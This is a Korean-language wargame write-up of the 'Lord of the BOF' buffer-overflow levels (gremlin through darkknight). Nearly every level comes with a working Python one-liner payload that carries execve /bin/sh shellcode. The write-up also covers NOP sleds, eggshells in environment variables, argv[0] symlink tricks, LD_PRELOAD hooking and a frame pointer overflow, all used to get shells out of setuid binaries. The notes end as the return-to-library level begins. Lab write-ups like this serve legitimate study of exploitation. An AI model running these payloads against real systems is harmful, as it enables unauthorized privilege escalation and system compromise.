shell_code : \x31\xd2\x52\x68\x2f\x2f\x73\x68\x68\x2f\x62\x69\x6e\x52\x8d\x54\x24\x04\x52\x31\xc0\xb0\x0b\x8b\x1c\x24\x89\xe1\x31\xd2\xcd\x80

my-pass : 패스워드 찾는 특별 명령어

0x8048466 => strcpy 함수 실행 주소

ebp => 0xbffffa48
esp => 0xbffff948

$( python -c 'print "\x31\xd2\x52\x68\x2f\x2f\x73\x68\x68\x2f\x62\x69\x6e\x52\x8d\x54\x24\x04\x52\x31\xc0\xb0\x0b\x8b\x1c\x24\x89\xe1\x31\xd2\xcd\x80" + "A" * 228 + "\x48\xf9\xff\xbf"' )



==========================================================================================

<gremlin : hello bof world >

cobolt 실행파일과 그 소스파일이 존재하고, 실행파일이 SETUGID 설정이 되어있다
실행 시 인자를 넣어줘야 하고, 소스코드를 보면 strcpy 함수를 사용해서 
실행 시 입력 된 인자를 지역변수 buffer에 넣고 있다

매개변수 입력에 취약한 버퍼오버플로우 취약점이다

디버깅을 통해서 메모리의 주소를 알아내자


ebp : 0xbffffae8
esp : 0xbffffad8

문제점.
쉘코드보다 인자를 받는 지역변수의 메모리가 더 작다

$( python -c 'print "A"*20 + "\xf0\xfa\xff\xbf" + "\x31\xd2\x52\x68\x2f\x2f\x73\x68\x68\x2f\x62\x69\x6e\x52\x8d\x54\x24\x04\x52\x31\xc0\xb0\x0b\x8b\x1c\x24\x89\xe1\x31\xd2\xcd\x80"' )

메모리는 높은 주소로밖에 접근할 수 없으므로, 앞에 더미를 넣고, 리턴주소 위치에 원래 리턴 주소보다 뒤의 주소를 넣고
거기서 부터 쉘 코드를 넣으면 실행됨


BOF를 어떻게 막을 것인가?
	
  1. 쉘 코드를 메모리에 로드시킬 수 있어야 한다
  2. eip 레지스터의 값을 쉘 코드의 주소로 변조시킬 수 있어야 한다

방어기법

	랜덤 메모리, 스택가드(쉴드), 비 실행 스택 ...

cobolt
	
	1. 16바이트의 작은 버퍼 사이즈
	
	더미(20) + ret + 공백 + 쉘코드(32)
	

================================================================================================

<cobolt : hacking exposed >

goblin 실행파일과 그 소스파일이 존재
역시 실행파일에 SETUGID 설정이 되어있다

취약함 표준 입력 함수 gets를 사용하고 있고, 
입력값을 지역변수 buffer에 넣은다음 화면에 출력해주는 프로그램

gets 입력을 받을시, buffer에 할당된 것보다 더 입력한다면, 메모리 주소를 넘어가서 덮어 쓸 수 있을 것이다
그런데 buffer의 메모리 공간이 16바이트 뿐. 

gdb 분석결과 16바이트 바로 뒤에 ebp, ret 의 위치가 존재하기 때문에,
앞서 문제와 같이 더미로 앞을 채워주고 뒤에 값을 넣는 것이 유효할 듯


ebp : 0xbffffb08
ret : 0xbffffb0b	=> 쉘 코드를 넣어야 하는 주소는 +4 = 0xbffffb10
esp : 0xbffffaf8

표준 입력함수로 넣을 입력값 ( python -c 'print "A"*20 + "\x10\xfb\xff\xbf" + "\x31\xd2\x52\x68\x2f\x2f\x73\x68\x68\x2f\x62\x69\x6e\x52\x8d\x54\x24\x04\x52\x31\xc0\xb0\x0b\x8b\x1c\x24\x89\xe1\x31\xd2\xcd\x80"';cat) | ./goblin


================================================================================================

<goblin : hackers proof >

orc 실행파일과 그 소스파일이 주어졌다
실행파일은 역시 SETUGID 설정 되어있음
	
ebp : 0xbffffad8
esp : 0xbffffaac( int i )
char buffer[40]
int i
stack 44bytes

#include <stdio.h>
#include <stdlib.h>

extern char **environ;

main(int argc, char *argv[])
{
	char buffer[40];
	int i;

	if(argc < 2){
		printf("argv error\n");
		exit(0);
	}

	// egghunter 
	for(i=0; environ[i]; i++)
		memset(environ[i], 0, strlen(environ[i]));

	if(argv[1][47] != '\xbf')
	{
		printf("stack is still your friend.\n");
		exit(0);
	}

	strcpy(buffer, argv[1]); 
	printf("%s\n", buffer);
}

if(argv[1][47] != '\xbf')
=> 인자의 48번째 값이 \xbf 라면 조건문을 통과한다
   그래서 인자의 48바이트 자리에 \xbf를 넣었더니 strcpy가 실행된다

$( python -c 'print "A"*44 + "\xc0\xfa\xff\xbf" + "\x31\xd2\x52\x68\x2f\x2f\x73\x68\x68\x2f\x62\x69\x6e\x52\x8d\x54\x24\x04\x52\x31\xc0\xb0\x0b\x8b\x1c\x24\x89\xe1\x31\xd2\xcd\x80"')

\xe0\xfa\xff\xbf

========================================================================================================

< orc : cantata >

extern char **environ;

main(int argc, char *argv[])
{
        char buffer[40];
        int i;

        if(argc < 2){
                printf("argv error\n");
                exit(0);
        }

        // egghunter
        for(i=0; environ[i]; i++)
                memset(environ[i], 0, strlen(environ[i]));

        if(argv[1][47] != '\xbf')
        {
                printf("stack is still your friend.\n");
                exit(0);
        }
        strcpy(buffer, argv[1]);
        printf("%s\n", buffer);

        // buffer hunter
        memset(buffer, 0, 40);
}

=> orc와 같은 방식으로 코드가 작성되어 있다.
   memset을 통해서 환경변수를 다 초기화 시키고 있다 => eggshell을 사용하지 못하도록
   if 문에서 입력받은 인자 argv의 48번째 값이 \xbf이면 조건문을 실행하지 않고 통과한다
   => 스택외의 다른 메모리를 이용할 수 없게하는 조건
  그리고 그 후에 버퍼를 다 지워버리므로, ebp 앞에 쉘 코드를 넣는다면 실행 될 수없으므로,
  ebp 뒤로 쉘코드를 넣어준다


0xbffffacc

\xd0\xfa\xff\xbf


$( python -c 'print "A"*44 + "\xd0\xfa\xff\xbf" + "\x31\xd2\x52\x68\x2f\x2f\x73\x68\x68\x2f\x62\x69\x6e\x52\x8d\x54\x24\x04\x52\x31\xc0\xb0\x0b\x8b\x1c\x24\x89\xe1\x31\xd2\xcd\x80"')


=========================================================================================================

< wolfman : love eyuna >

extern char **environ;

main(int argc, char *argv[])
{
	char buffer[40];
	int i;

	if(argc < 2){
		printf("argv error\n");
		exit(0);
	}

	// egghunter 
	for(i=0; environ[i]; i++)
		memset(environ[i], 0, strlen(environ[i]));	=> eggshell 사용불가

	if(argv[1][47] != '\xbf')				=> 두번째 인자의 48번째는 \xbf
	{
		printf("stack is still your friend.\n");
		exit(0);
	}

	// check the length of argument
	if(strlen(argv[1]) > 48){				=> 입력된 인자의 길이 48이상 불가
		printf("argument is too long!\n");
		exit(0);
	}

	strcpy(buffer, argv[1]); 				=> 인자를 버퍼로 복사
	printf("%s\n", buffer);

        // buffer hunter
        memset(buffer, 0, 40);					=> 버퍼 초기화
}

이번에는 조건이 하나 더 추가되었는데,
입력받는 인자의 길이가 48을 넘어선다면 프로그램을 종료시킨다
그리고 프로그램 종료 전 버퍼를 0으로 초기화 시켜서 버퍼에 쉘 코드를 올릴 수 없게 한다

그런데, 추가된 조건에서는 첫번째 인자만 검사를 하고 있으므로, 
인자를 더 추가해서 쉘코드를 넣고, 그 주소를 리턴주소로 넣는다면
실행 되지 않을까


0xbffffc32
\x32\xfc\xff\xbf

$( python -c 'print "A"*44 + "\x32\xfc\xff\xbf" + " " + "\x31\xd2\x52\x68\x2f\x2f\x73\x68\x68\x2f\x62\x69\x6e\x52\x8d\x54\x24\x04\x52\x31\xc0\xb0\x0b\x8b\x1c\x24\x89\xe1\x31\xd2\xcd\x80"')


=====================================================================================================

< darkelf : kernel crashed >

extern char **environ;

main(int argc, char *argv[])
{
	char buffer[40];
	int i;

	if(argc < 2){						=> 인자가 존재해야 하고
		printf("argv error\n");
		exit(0);
	}

	// here is changed!
	if(strlen(argv[0]) != 77){				=> argv[0] : 실행 파일의 이름
                printf("argv[0] error\n");			   이것의 길이가 77이어야 조건문을 조건문을 통과할 수 있다
                exit(0);
	}							=> 프로그램을 실행할때, 절대경로로 써주는데, / 를 여러개 사용할 수 있으므로 
									길이를 77로 맞춰주고 실행시키면 파일명의 길이를 77로 맞출 수 있다

	// egghunter 
	for(i=0; environ[i]; i++)				=> 에그헌터 방지
		memset(environ[i], 0, strlen(environ[i]));

	if(argv[1][47] != '\xbf')				=> 48번째에 \xbf => 스택메모리만 사용
	{
		printf("stack is still your friend.\n");
		exit(0);
	}

	// check the length of argument
	if(strlen(argv[1]) > 48){				=> 인자의 길이가 48이하여야 한다
		printf("argument is too long!\n");
		exit(0);
	}

	strcpy(buffer, argv[1]); 				=> 버퍼오버플로우가 실행되는 지역
	printf("%s\n", buffer);

        // buffer hunter
        memset(buffer, 0, 40);					=> 지역변수 버퍼를 초기화
}



* nop : nopslide(sled) 기법

 \x90

링크를 걸어서 해결


============================================================================================================

< orge : timewalker >

extern char **environ;

main(int argc, char *argv[])
{
	char buffer[40];
	int i;

	// here is changed
	if(argc != 2){						=> argc 가 무조건 2여야 한다
		printf("argc must be two!\n");			   즉, 입력할 수 있는 인자는 1개뿐이다.
		exit(0);
	}

	// egghunter 
	for(i=0; environ[i]; i++)				=> 에그쉘 사용 할 수 없고
		memset(environ[i], 0, strlen(environ[i]));

	if(argv[1][47] != '\xbf')				=> 인자의 48번째는 \xbf, 즉 스택메모리만 사용 할 수 있고
	{
		printf("stack is still your friend.\n");
		exit(0);
	}

	// check the length of argument
	if(strlen(argv[1]) > 48){				=> 인자의 길이는 48을 넘길 수 없다
		printf("argument is too long!\n");
		exit(0);
	}

	strcpy(buffer, argv[1]); 				=> 오버플로우 시도 가능한 부분
	printf("%s\n", buffer);

        // buffer hunter
        memset(buffer, 0, 40);					=> 지역변수 버퍼를 초기화 하고

	// one more!
	memset(argv[1], 0, strlen(argv[1]));			=> 입력받은 인자도 초기화 시킨다
}

사용할 수 있는 메모리 공간 => argv[0] 공간



0xbffffc03

\x43\xfb\xff\xbf

0xbffffb43



"\x31\xd2\x52\x68\x2f\x2f\x73\x68\x68\x2f\x62\x69\x6e\x52\x8d\x54\x24\x04\x52\x31\xc0\xb0\x0b\x8b\x1c\x24\x89\xe1\x31\xd2\xcd\x80"
=> 쉘코드를 파일 이름으로 넣을 수 있다면, argv[0]을 사용할 수 있다
=> 쉘코드를 이름으로 하는 링크를 실행파일에 걸어줄 수 있다면 가능할 거 같은데
=> 링크가 안걸린다


0xbffffc03
\xf8\xfb\xff\xbf

* 리눅스에서 파일 이름의 최대 길이를 256바이트 까지 가능

=> 드디어 해결

====================================================================================================

< troll : aspirin >

/*
        The Lord of the BOF : The Fellowship of the BOF
        - vampire
        - check 0xbfff
*/

#include <stdio.h>
#include <stdlib.h>

main(int argc, char *argv[])
{
	char buffer[40];

	if(argc < 2){
		printf("argv error\n");
		exit(0);
	}

	if(argv[1][47] != '\xbf')
	{
		printf("stack is still your friend.\n");
		exit(0);
	}

        // here is changed!
        if(argv[1][46] == '\xff')
        {
                printf("but it's not forever\n");
                exit(0);
        }

	strcpy(buffer, argv[1]); 
	printf("%s\n", buffer);
}


1. 입력받은 아규먼트의 갯수는 2개이상
2. 아규먼트 48번째는 \xbf
3. 아규먼트 47번째는 \xff가 아니어야 한다

3번이 처음보는 조건인데, 주소를 항상 \xbf\xff\x~~\x~~ 를 사용했다 => stack 메모리 지역
그런데, 그 지역을 사용할 수 없게했다, 즉 stack 메모리도 사용할 수 없도록 만들었다
그래서 마지막 스택 지역을 벗어난 \xbf\xfe\x~~\x~~ 를 사용하고,
nop 코드를 많이 붙여서 실행했더니 풀린다


* 환경변수를 이용하는 방법
export sh=$( python -c 'print "\x90" * 100000 + "\x31\xd2\x52\x68\x2f\x2f\x73\x68\x68\x2f\x62\x69\x6e\x52\x8d\x54\x24\x04\x52\x31\xc0\xb0\x0b\x8b\x1c\x24\x89\xe1\x31\xd2\xcd\x80"' )
이렇게 환경변수에 대량의 nop코드와 쉘코드를 올려 놓고, ret주소만 범위내에서 지정해주면, 알아서 쉘코드가 실행된다

===============================================================================================

< vampire : music world >

/*
        The Lord of the BOF : The Fellowship of the BOF
        - skeleton
        - argv hunter
*/

#include <stdio.h>
#include <stdlib.h>

extern char **environ;

main(int argc, char *argv[])
{
	char buffer[40];
	int i, saved_argc;

	if(argc < 2){
		printf("argv error\n");
		exit(0);
	}

	// egghunter 
	for(i=0; environ[i]; i++)
		memset(environ[i], 0, strlen(environ[i]));

	if(argv[1][47] != '\xbf')
	{
		printf("stack is still your friend.\n");
		exit(0);
	}

	// check the length of argument
	if(strlen(argv[1]) > 48){
		printf("argument is too long!\n");
		exit(0);
	}

	// argc saver
	saved_argc = argc;

	strcpy(buffer, argv[1]); 
	printf("%s\n", buffer);

        // buffer hunter
        memset(buffer, 0, 40);

	// ultra argv hunter!
	for(i=0; i<saved_argc; i++)
		memset(argv[i], 0, strlen(argv[i]));
}


1. 아규먼트 갯수 2개이상
2. 에그헌터 : 환경변수를 모두 초기화
3. 아규먼트 길이 48로 제한
4. 지역변수 버퍼 초기화
5. 아규먼트 [0], [1] 모두 초기화( 파일이름, 인자 모두 초기화 )

 * 거의 대부분의 사용가능한 메모리를 없애버린다
 * 그럼에도 불구하고 아직 사용가능한 메모리가 존재한다

0xbfffffe1 => 이 부분에도 파일이름이 들어간다( 스택의 밑바닥 )
\xe2\xff\xff\xbf
그러면 파일 이름을 쉘 코드로 만들어서 링크를 걸어서 실행한다면, 실행되지 않을까



0xbfffffdb
\xdb\xff\xff\xbf
=> 이 부분에 파일이름이 올라가니, 파일이름을 쉘코드로 만들고, 이 부분의 주소로 리턴주소를 덮어쓰면
   쉘코드가 실행된다




==============================================================================================

< skeleton : shellcoder >

/*
        The Lord of the BOF : The Fellowship of the BOF
        - golem
        - stack destroyer
*/

#include <stdio.h>
#include <stdlib.h>

extern char **environ;

main(int argc, char *argv[])
{
	char buffer[40];
	int i;

	if(argc < 2){
		printf("argv error\n");
		exit(0);
	}

	if(argv[1][47] != '\xbf')
	{
		printf("stack is still your friend.\n");
		exit(0);
	}

	strcpy(buffer, argv[1]); 
	printf("%s\n", buffer);

        // stack destroyer!
        memset(buffer, 0, 44);
	memset(buffer+48, 0, 0xbfffffff - (int)(buffer+48));
}

1. 아규먼트가 2개이상
2. 아규먼트의 48번째 \xbf
3. 지역변수부터 ret주소 부분 4바이트 제외하고 스택 전체 초기화

  * 문제로 나왔다는 얘기는 어딘가 사용가능한 부분이 존재한다는 뜻

  * 사용자 버퍼를 기준으로 높은 메모리는 사용할 수 있는 곳이 없다
  * 낮은 쪽 메모리를 살펴봐야 한다
  
  - LD_PRELOAD를 사용해야만 낮은 쪽 메모리에서 뭔가를 찾을 수 있다.
  - 이름에서 볼 수 있는 것처럼 뭔가 먼저 로딩되는 무언가임을 알 수 있다

리눅스의 전역후킹 기법

	call printf -> 공유 메모리 영역에 있는 libc.so 파일내의 printf를 실행

	LD_PRELOAD에 등록된 라이브러리 파일은 일반 라이브러리 파일보다 
	먼저 참조된다



라이브러리 컴파일 방식
  gcc -o hook.so -fPIC --shared hook.c


0xbffff50b
\x0b\xf5\xff\xbf


ln -s /home/skeleton/hook.so $( python -c 'print "\x90"*200 + "\x31\xd2\x52\x68\x2f\x2f\x73\x68\x68\x2f\x62\x69\x6e\x52\x8d\x54\x24\x04\x52\x31\xc0\xb0\x0b\x8b\x1c\x24\x89\xe1\x31\xd2\xcd\x80"' )

=======================================================================================

< golem : cup of coffee >


/*
        The Lord of the BOF : The Fellowship of the BOF
        - darkknight
        - FPO		=> 
*/

#include <stdio.h>
#include <stdlib.h>

void problem_child(char *src)
{
	char buffer[40];
	strncpy(buffer, src, 41);
	printf("%s\n", buffer);
}

main(int argc, char *argv[])
{
	if(argc<2){
		printf("argv error\n");
		exit(0);
	}

	problem_child(argv[1]);
}

1. 아규먼트 갯수 2개이상
2. 함수 호출


  - FPO( Frame Pointer Overflow )
  - Fake EBP

  - strcpy는 오버플로우에 취약한 함수
  - strncpy는 주어진 길이만큼만 복사가 된다


  - 서브 함수에서 선언된 지역변수의 크기보다 strncpy 에서 받아들이는 길이가 1 더 길다.
    이 1 바이트에 가짜 주소를 넣어서 ret addr의 위치를 바꿀 수 있다


$( python -c 'print "A"*4 + "\xac\xfa\xff\xbf" + "\x31\xd2\x52\x68\x2f\x2f\x73\x68\x68\x2f\x62\x69\x6e\x52\x8d\x54\x24\x04\x52\x31\xc0\xb0\x0b\x8b\x1c\x24\x89\xe1\x31\xd2\xcd\x80" + "\xa4"' )




0xbffffc3b => 여기부터 



0xbfffd394	=> 인자 41번째를 94로

0xbfffd560
\x60\xd5\xff\xbf	=> 리턴주소를 이걸로

$( python -c 'print "AAAA" + "\x60\xd5\xff\xbf" + "A"*32 + "\xa4" + "\x90"*9959 + "\x31\xd2\x52\x68\x2f\x2f\x73\x68\x68\x2f\x62\x69\x6e\x52\x8d\x54\x24\x04\x52\x31\xc0\xb0\x0b\x8b\x1c\x24\x89\xe1\x31\xd2\xcd\x80"' )


========================================================================================================

< darknight : new attacker >

/*
        The Lord of the BOF : The Fellowship of the BOF
        - bugbear
        - RTL1
*/

#include <stdio.h>
#include <stdlib.h>

main(int argc, char *argv[])
{
	char buffer[40];
	int i;

	if(argc < 2){
		printf("argv error\n");
		exit(0);
	}

	if(argv[1][47] == '\xbf')
	{
		printf("stack betrayed you!!\n");
		exit(0);
	}

	strcpy(buffer, argv[1]); 
	printf("%s\n", buffer);
}

1. 아규먼트 갯수 2개 이상
2. 아규먼트 48번째 값이 \xbf 이면 안됨 => 스택메모리 사용 금지

  * RTL ( Return To Library )
    - 아마도 라이브러리 영역을 사용해야 하는듯 하다
    
























